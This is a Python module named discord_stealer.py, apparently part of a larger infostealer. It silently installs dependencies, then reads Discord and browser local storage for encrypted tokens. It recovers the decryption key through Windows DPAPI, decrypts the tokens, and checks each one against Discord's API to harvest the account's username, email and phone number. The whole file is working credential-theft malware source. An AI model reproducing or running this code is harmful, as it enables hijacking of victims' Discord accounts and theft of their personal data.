# modules/discord_stealer.py - Discord token extraction

import os
import sys
import json
import re
import base64
import subprocess
import urllib.request

def install_import(modules):
    for module, pip_name in modules:
        try:
            __import__(module)
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name],
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            os.execl(sys.executable, sys.executable, *sys.argv)

install_import([
    ("win32crypt", "pypiwin32"),
    ("Crypto.Cipher", "pycryptodome")
])

import win32crypt
from Crypto.Cipher import AES
from config import LOCAL, ROAMING, log

PATHS = {
    'Discord': ROAMING + '\\discord',
    'Discord Canary': ROAMING + '\\discordcanary',
    'Discord PTB': ROAMING + '\\discordptb',
    'Lightcord': ROAMING + '\\Lightcord',
    'Chrome': LOCAL + "\\Google\\Chrome\\User Data\\Default",
    'Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Default',
    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable'
}

def get_headers(token=None):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    if token:
        headers.update({"Authorization": token})
    return headers

def get_tokens(path):
    path += "\\Local Storage\\leveldb\\"
    tokens = []
    
    if not os.path.exists(path):
        return tokens
    
    for file in os.listdir(path):
        if not (file.endswith(".ldb") or file.endswith(".log")):
            continue
        
        try:
            with open(f"{path}{file}", "r", errors="ignore") as f:
                for line in f.readlines():
                    for match in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line.strip()):
                        tokens.append(match)
        except:
            continue
    
    return tokens

def get_key(path):
    try:
        with open(path + "\\Local State", "r") as f:
            key = json.loads(f.read())['os_crypt']['encrypted_key']
        return base64.b64decode(key)[5:]
    except:
        return None

def decrypt_token(enc_token, key):
    try:
        key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
        enc_token = base64.b64decode(enc_token.split('dQw4w9WgXcQ:')[1])
        nonce = enc_token[3:15]
        ciphertext = enc_token[15:]
        cipher = AES.new(key, AES.MODE_GCM, nonce)
        token = cipher.decrypt(ciphertext)[:-16].decode()
        return token
    except:
        return None

def grab():
    """Main Discord token grabbing function - returns token data"""
    log("Grabbing Discord tokens...")
    
    checked = []
    token_data = []
    
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
        
        key = get_key(path)
        if not key:
            continue
        
        for enc_token in get_tokens(path):
            token = decrypt_token(enc_token, key)
            if not token or token in checked:
                continue
            
            checked.append(token)
            
            try:
                req = urllib.request.Request(
                    'https://discord.com/api/v10/users/@me',
                    headers=get_headers(token)
                )
                res = urllib.request.urlopen(req)
                if res.getcode() != 200:
                    continue
                
                user_info = json.loads(res.read().decode())
                token_data.append({
                    'token': token,
                    'platform': platform,
                    'username': user_info.get('username'),
                    'id': user_info.get('id'),
                    'email': user_info.get('email'),
                    'phone': user_info.get('phone')
                })
            except:
                continue
    
    log(f"Found {len(token_data)} Discord tokens")
    return token_data